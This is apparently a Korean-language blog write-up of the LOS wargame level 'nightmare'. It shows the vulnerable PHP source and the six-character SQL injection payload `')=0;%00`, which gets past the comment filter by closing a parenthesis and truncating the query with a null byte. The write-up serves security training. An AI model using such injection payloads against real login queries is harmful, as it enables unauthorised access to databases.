---
layout: post
title: ! "[LOS] nightmare"
categories: [LOS]
excerpt: " "
comments: true
share: true
tags:
  - Web-hacking
  - LOS
  - write-up
---

`query : select id from prob_nightmare where pw=('') and id!='admin'`

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

pw 부분이 괄호가 쳐져있고 pw의 길이도 6이 넘으면 안된다.
`#,-`과 같은 주석 처리도 필터링되므로 괄호를 이용해 문제를 풀어야할 것 같다.

mysql에서 ''과 일치하는 것은 0이므로 `')=0;%00`와 같이 참 조건을 만들어주고
`and id!=admin` 부분을 생략하도록 세미콜론과 null 문자를 넣어줌으로써 풀 수 있다.

![]({{ site.baseurl }}/assets/posts/los/nightmare_clear.png)

클리어!!
